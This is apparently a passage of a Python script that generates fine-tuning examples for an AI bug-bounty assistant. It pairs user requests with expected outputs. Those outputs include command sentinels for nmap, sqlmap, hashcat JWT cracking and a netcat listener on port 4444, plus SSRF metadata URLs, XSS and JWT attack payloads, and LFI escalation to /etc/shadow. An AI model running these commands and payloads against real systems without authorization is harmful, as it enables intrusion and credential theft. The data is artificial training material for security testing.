2. "impact": A paragraph describing the business/security impact of this vulnerability

Return JSON: {{ "summary": "...", "impact": "..." }}"""

    entries.append(entry(
        pid, "platform_report_generation",
        f"ReportGenerator AI content — {sc['vuln']} at {sc['program']}",
        "",
        prompt_text,
        "Generate professional bug bounty report content in exact JSON schema with factual, concise summary and business-impact-focused impact section.",
        json.dumps(sc['expected'], indent=2),
        "Valid JSON with 'summary' and 'impact' keys; summary is 2-3 sentences, factual, references endpoint and payload; impact describes business consequences, affected data, and potential attacker actions.",
    ))


# ════════════════════════════════════════════════════════════════════════════
# SECTION 5 — CMD Sentinel Format (Chat Interface)
# ════════════════════════════════════════════════════════════════════════════

CMD_SCENARIOS = [
    # Single tool, CLI (detached: false)
    ("run nmap on 10.10.10.5 — full port scan with version detection",
     'Running a full port scan with version detection on 10.10.10.5.\n[CMD: {"bin": "nmap", "args": ["-sV", "-p-", "--min-rate", "1000", "10.10.10.5"], "detached": false, "description": "Full TCP port scan with service version detection"}]'),
    ("scan for common vulnerabilities on 192.168.1.100 with nuclei",
     'Launching nuclei against 192.168.1.100 with default templates.\n[CMD: {"bin": "nuclei", "args": ["-u", "http://192.168.1.100", "-severity", "medium,high,critical", "-o", "/tmp/nuclei-out.txt"], "detached": false, "description": "Nuclei vulnerability scan with medium+ severity templates"}]'),
    ("run ffuf to fuzz the /api/v1/ directory on target.com",
     'Running directory fuzzing on /api/v1/ with ffuf.\n[CMD: {"bin": "ffuf", "args": ["-u", "https://target.com/api/v1/FUZZ", "-w", "/usr/share/wordlists/dirb/common.txt", "-mc", "200,201,301,302,401,403", "-o", "/tmp/ffuf-api.json", "-of", "json"], "detached": false, "description": "Directory fuzzing on /api/v1/ with common wordlist"}]'),
    ("test for sql injection on https://shop.brand.com/search?q=test",
     'Running sqlmap against the search endpoint to test for SQL injection.\n[CMD: {"bin": "sqlmap", "args": ["-u", "https://shop.brand.com/search?q=test", "--batch", "--level", "2", "--risk", "1", "--dbms", "mysql", "-o"], "detached": false, "description": "SQL injection test on search endpoint"}]'),
    ("check what tech stack is running on example.com",
     'Running whatweb to fingerprint the technology stack on example.com.\n[CMD: {"bin": "whatweb", "args": ["--aggression=3", "--log-json=/tmp/whatweb-out.json", "https://example.com"], "detached": false, "description": "Technology fingerprinting on example.com"}]'),
    ("enumerate subdomains for target.io",
     'Running subfinder to enumerate subdomains for target.io.\n[CMD: {"bin": "subfinder", "args": ["-d", "target.io", "-o", "/tmp/subdomains.txt", "-silent"], "detached": false, "description": "Subdomain enumeration for target.io"}]'),
    ("check the headers and security configuration of https://api.fintech.io",
     'Checking HTTP headers and security configuration with curl.\n[CMD: {"bin": "curl", "args": ["-sI", "https://api.fintech.io", "-A", "Mozilla/5.0"], "detached": false, "description": "HTTP header inspection for security misconfiguration check"}]'),
    ("run gobuster to find hidden directories on https://cms.enterprise.net",
     'Running gobuster directory enumeration on cms.enterprise.net.\n[CMD: {"bin": "gobuster", "args": ["dir", "-u", "https://cms.enterprise.net", "-w", "/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt", "-x", "php,html,txt,bak,zip", "-o", "/tmp/gobuster-cms.txt"], "detached": false, "description": "Directory and file enumeration on CMS target"}]'),
    ("test the JWT token for weak secrets",
     'Running hashcat to test the JWT token for weak HMAC-SHA256 secrets.\n[CMD: {"bin": "hashcat", "args": ["-a", "0", "-m", "16500", "/tmp/token.jwt", "/usr/share/wordlists/rockyou.txt", "--force"], "detached": false, "description": "JWT secret brute-force with rockyou wordlist"}]'),
    ("scan for XSS vulnerabilities on https://app.example.com/search?q=test",
     'Running dalfox to test for XSS on the search endpoint.\n[CMD: {"bin": "dalfox", "args": ["url", "https://app.example.com/search?q=test", "--skip-bav", "-o", "/tmp/dalfox-xss.txt"], "detached": false, "description": "XSS scanning with dalfox on search parameter"}]'),

    # GUI tools (detached: true)
    ("open burp suite",
     'Launching Burp Suite Community Edition.\n[CMD: {"bin": "burpsuite", "args": [], "detached": true, "description": "Open Burp Suite proxy"}]'),
    ("pull up wireshark so I can capture traffic",
     'Launching Wireshark for network traffic capture.\n[CMD: {"bin": "wireshark", "args": [], "detached": true, "description": "Open Wireshark packet capture"}]'),
    ("open firefox for manual testing",
     'Opening Firefox browser.\n[CMD: {"bin": "firefox", "args": [], "detached": true, "description": "Launch Firefox for manual testing"}]'),
    ("start metasploit",
     'Launching Metasploit Framework console.\n[CMD: {"bin": "msfconsole", "args": [], "detached": true, "description": "Open Metasploit Framework"}]'),

    # Multi-step commands
    ("change my MAC address on eth0 to something random",
     'Randomizing the MAC address on eth0 — bringing interface down, changing MAC, then back up.\n[CMD: {"steps": [{"bin": "ip", "args": ["link", "set", "eth0", "down"]}, {"bin": "macchanger", "args": ["-r", "eth0"]}, {"bin": "ip", "args": ["link", "set", "eth0", "up"]}], "detached": false, "description": "Randomize MAC address on eth0"}]'),
    ("set up a netcat listener on port 4444",
     'Starting a netcat listener on port 4444 for incoming connections.\n[CMD: {"bin": "nc", "args": ["-lvnp", "4444"], "detached": false, "description": "Netcat listener on port 4444"}]'),
    ("run a quick nikto scan against http://10.10.10.5",
     'Running Nikto web server scanner against the target.\n[CMD: {"bin": "nikto", "args": ["-h", "http://10.10.10.5", "-Format", "txt", "-output", "/tmp/nikto-out.txt"], "detached": false, "description": "Nikto web vulnerability scan"}]'),
    ("show my network interfaces",
     'Listing all network interfaces and their IP addresses.\n[CMD: {"bin": "ip", "args": ["addr"], "detached": false, "description": "List network interfaces"}]'),
    ("enumerate SMB shares on 192.168.1.50",
     'Running smbclient to enumerate SMB shares on the target.\n[CMD: {"bin": "smbclient", "args": ["-L", "//192.168.1.50/", "-N"], "detached": false, "description": "SMB share enumeration (null session)"}]'),
    ("check if port 22 is open on 10.0.0.1",
     'Running a targeted nmap scan for port 22 on 10.0.0.1.\n[CMD: {"bin": "nmap", "args": ["-p", "22", "-sV", "10.0.0.1"], "detached": false, "description": "Check SSH port 22 status"}]'),

    # Pure questions (NO command emitted)
    ("what is SSRF and how do I test for it?",
     "SSRF (Server-Side Request Forgery) occurs when an attacker can make the server issue HTTP requests to arbitrary URLs, including internal services and cloud metadata endpoints.\n\n**How to test:**\n1. Find any parameter that accepts a URL (webhook URLs, image fetch, PDF generation, import/export).\n2. Start with external callback: `https://your-burp-collaborator-id.oastify.com` — confirms out-of-band SSRF.\n3. Escalate to internal: `http://169.254.169.254/latest/meta-data/` (AWS), `http://metadata.google.internal/` (GCP).\n4. Try `http://localhost:6379/` (Redis), `http://127.0.0.1:27017/` (MongoDB) for internal service access.\n5. Blind SSRF: use time-based detection if no response is reflected.\n\nKey bypass techniques: DNS rebinding, URL redirects, alternative IP representations (0x7f000001, 2130706433)."),
    ("what payloads should I try for XSS in a JSON context?",
     "In JSON API contexts where the response is reflected in a JavaScript variable or innerHTML, standard `<script>` tags won't work. Use these:\n\n**Break out of string context:**\n```\n\"-alert(1)-\"\n\\u003cscript\\u003ealert(1)\\u003c/script\\u003e\n```\n\n**Attribute injection (if rendered in HTML):**\n```html\n\" onmouseover=\"alert(1)\njavascript:alert(1)\n```\n\n**Template literal breakout (JS contexts):**\n```\n`${alert(1)}`\n```\n\n**JSON-specific:**\n```json\n{\"name\": \"</script><script>alert(1)</script>\"}\n```\n\nAlways check Content-Type: if response is `application/json`, XSS only triggers if a consumer `eval()`s or `innerHTML`s the value. Check the frontend code consuming the API."),
    ("explain how JWT attacks work",
     'JWT attacks target the verification logic rather than the token content.\n\n**1. Algorithm confusion (`alg: none`):**\nChange header to `{"alg":"none"}`, strip the signature. Some libraries skip verification.\n\n**2. RS256 → HS256 confusion:**\nIf server uses RS256, change to HS256 and sign with the *public key* as the HMAC secret. Libraries that don\'t verify the alg claim will accept it.\n\n**3. Weak secret brute-force:**\nHS256 JWTs can be cracked offline: `hashcat -a 0 -m 16500 token.jwt rockyou.txt`\n\n**4. `kid` injection:**\nIf header has `kid` (key ID), test SQL injection: `kid: \'x\' UNION SELECT \'attacker-secret\'--`\n\n**5. JWK Set injection:**\nSome implementations trust a `jku` or `x5u` URL in the header — point it to your own JWK endpoint.\n\nTool: `jwt_tool` covers all these automatically.'),
]

for i, (user_msg, expected_response) in enumerate(CMD_SCENARIOS):
    pid = f"PS-C{i+1:03d}"
    entries.append(entry(
        pid, "platform_cmd_sentinel",
        f"Chat interface CMD sentinel training — {'tool execution' if '[CMD:' in expected_response else 'pure answer'}",
        "",
        user_msg,
        "Produce the correct response format: emit [CMD: {...}] sentinel for execution requests using exact schema, or answer in plain markdown for knowledge questions.",
        expected_response,
        "Tool requests: CMD emitted at end of response, valid JSON, correct 'bin'/'args'/'detached'/'description' fields, detached=true for GUI apps; Knowledge questions: no CMD emitted, markdown formatted, technically accurate.",
    ))


# ════════════════════════════════════════════════════════════════════════════
# SECTION 6 — Confidence Calibration Examples
# ════════════════════════════════════════════════════════════════════════════

CALIBRATION_SCENARIOS = [
    {
        "obs": "Target runs Ruby on Rails with default error pages showing stack traces. No observed template engine in URL parameters.",
        "vuln": "ssti",
        "correct_confidence": 0.20,
        "reasoning": "SSTI requires user-controlled input reaching a template engine. Stack trace exposure confirms Rails, but without visible template-rendered parameters, confidence is low. Worth probing but no strong evidence.",
    },
    {
        "obs": "ffuf found /api/v1/user/1 returning {email, name, role}. Test with /api/v1/user/2 returned different user's data with status 200.",
        "vuln": "idor",
        "correct_confidence": 0.95,
        "reasoning": "Direct confirmation — different user's data returned with 200. This is not a hypothesis anymore, it's confirmed. Confidence near maximum.",
    },
    {
        "obs": "Parameter 'url' exists in a social sharing endpoint. Server makes HTTP HEAD request to validate URL (Referer shows internal IP 10.0.2.15 in error message).",
        "vuln": "ssrf",
        "correct_confidence": 0.82,
        "reasoning": "Internal IP in error message is strong SSRF evidence. Server is making outbound requests and the internal addressing scheme leaked. High confidence, missing only confirmation of metadata access.",
    },
    {
        "obs": "Login form with username and password. No visible error message differences between wrong username and wrong password.",
        "vuln": "auth_bypass",
        "correct_confidence": 0.30,
        "reasoning": "Consistent error messages suggest username enumeration is prevented, which is actually good security practice. Generic login forms have many possible auth issues but no specific signal here. Low-medium confidence.",
    },
    {
        "obs": "File download endpoint: /api/files/get?name=report.pdf. Server returns file contents. Testing with name=../../../etc/passwd returned binary data starting with 'root:x:0:0'.",
        "vuln": "lfi",
        "correct_confidence": 0.99,
        "reasoning": "/etc/passwd contents returned directly. This is confirmed path traversal/LFI — assign maximum confidence. Proceed to escalation: /etc/shadow, SSH keys, application source code, environment files.",
    },
]

for i, sc in enumerate(CALIBRATION_SCENARIOS):
    pid = f"PS-CC{i+1:03d}"
    prompt_text = f"""You are generating a hypothesis for the hunt engine. Assign the correct confidence score based on the evidence strength.

Observation: {sc['obs']}
Vulnerability class under consideration: {sc['vuln']}

What confidence score (0.0-1.0) would you assign to this hypothesis, and why?
Then produce the hypothesis JSON object."""

    expected = json.dumps({
        "vulnClass": sc['vuln'],
        "targetUrl": "https://target.example.com",
        "reasoning": sc['reasoning'],
        "confidence": sc['correct_confidence'],
        "priority": round(sc['correct_confidence'] * 10),
    }, indent=2)

    entries.append(entry(
        pid, "platform_confidence_calibration",
        f"Confidence calibration — {sc['vuln']} with {'strong' if sc['correct_confidence'] > 0.7 else 'weak'} evidence",
        "",
        prompt_text,
        f"Assign confidence {sc['correct_confidence']} based on evidence strength — {sc['reasoning'][:60]}",
        expected,
        f"Confidence within 0.10 of {sc['correct_confidence']}; reasoning references specific observed signals; priority matches confidence level.",
    ))


# ════════════════════════════════════════════════════════════════════════════
# SECTION 7 — Multi-Iteration Pivot (avoid repeating tested hypotheses)
# ════════════════════════════════════════════════════════════════════════════

PIVOT_SCENARIOS = [
    {
        "target": "https://app.example.com",
        "obs": "PHP/Laravel app, MySQL. Search endpoint, login form, file upload.",
        "prev_tested": ["xss (search endpoint) — rejected: output HTML-encoded", "sqli (search) — rejected: parameterized queries confirmed"],
        "expected_new": [
            {"vulnClass": "rce", "targetUrl": "https://app.example.com/upload", "reasoning": "XSS and SQLi on search are mitigated. Pivoting to file upload which hasn't been tested. PHP/Laravel may have unrestricted MIME type validation — test webshell upload.", "confidence": 0.65, "priority": 9},
            {"vulnClass": "idor", "targetUrl": "https://app.example.com/api/users", "reasoning": "Both search-based attacks failed. Laravel apps with MySQL commonly have sequential IDs on user/resource endpoints. Test horizontal privilege escalation.", "confidence": 0.60, "priority": 8},
            {"vulnClass": "auth_bypass", "targetUrl": "https://app.example.com/login", "reasoning": "Login form untested. Laravel default sessions — check for weak session fixation, mass assignment on registration, or password reset token flaws.", "confidence": 0.50, "priority": 7},
        ],
    },
    {
        "target": "https://api.fintech.io/graphql",
        "obs": "GraphQL API, Node.js, PostgreSQL. Auth via JWT. Introspection enabled.",
        "prev_tested": ["idor (account IDs) — rejected: UUIDs used, enumeration impractical", "csrf (fund transfer) — rejected: SameSite=Strict cookie confirmed"],
        "expected_new": [
            {"vulnClass": "auth_bypass", "targetUrl": "https://api.fintech.io/graphql", "reasoning": "IDOR failed (UUIDs) and CSRF mitigated (SameSite). Pivoting to JWT attacks — HS256 with weak secret or alg:none bypass. Introspection reveals mutation structure for privilege escalation.", "confidence": 0.72, "priority": 9},
            {"vulnClass": "info_disclosure", "targetUrl": "https://api.fintech.io/graphql", "reasoning": "GraphQL introspection shows internal field names. Test for batch query abuse, field-level authorization bypass — request admin-only fields with user token.", "confidence": 0.68, "priority": 8},
            {"vulnClass": "ssrf", "targetUrl": "https://api.fintech.io/graphql", "reasoning": "Check for URL-accepting mutations not visible in initial surface scan. Payment/webhook mutations in fintech GraphQL APIs often accept callback URLs.", "confidence": 0.55, "priority": 7},
        ],
    },
]

for i, sc in enumerate(PIVOT_SCENARIOS):
    pid = f"PS-P{i+1:03d}"
    prev_str = "\n".join(f"- {h}" for h in sc['prev_tested'])
    prompt_text = f"""You are an expert security researcher performing bug bounty hunting.

Target: {sc['target']}
Observations: {sc['obs']}

Previously tested hypotheses (ALREADY REJECTED — do not repeat these):
{prev_str}

Previously tested hypotheses: {len(sc['prev_tested'])}

Generate 3-5 NEW hypotheses that pivot away from failed attack vectors.
Each hypothesis must have vulnClass, targetUrl, reasoning, confidence (0.0-1.0), priority (1-10).
Return ONLY valid JSON array."""

    entries.append(entry(
        pid, "platform_hypothesis_pivot",
        f"Multi-iteration pivot after {len(sc['prev_tested'])} rejected hypotheses on {sc['target']}",
        "",
        prompt_text,
        "Generate hypotheses that avoid already-tested vuln classes and pivot to untested attack surfaces.",
        json.dumps(sc['expected_new'], indent=2),
        "No repeated vulnClass+endpoint combinations from rejected list; reasoning explicitly acknowledges pivot from failed vectors; new hypotheses target untested endpoints/parameters.",
    ))


# ════════════════════════════════════════════════════════════════════════════
# Write output
# ════════════════════════════════════════════════════════════════════════════

OUT.parent.mkdir(parents=True, exist_ok=True)
OUT.write_text(json.dumps(entries, indent=2, ensure_ascii=False))

print(f"\n{'='*60}")
print(f"  Platform schema training data generated")
print(f"  Output : {OUT}")
print(f"  Entries: {len(entries)}")
print()
cats = {}
for e in entries:
    cats[e['category']] = cats.get(e['category'], 0) + 1
for cat, count in sorted(cats.items()):
    print(f"    {cat:<40} {count:>3}")
print("=" * 60)
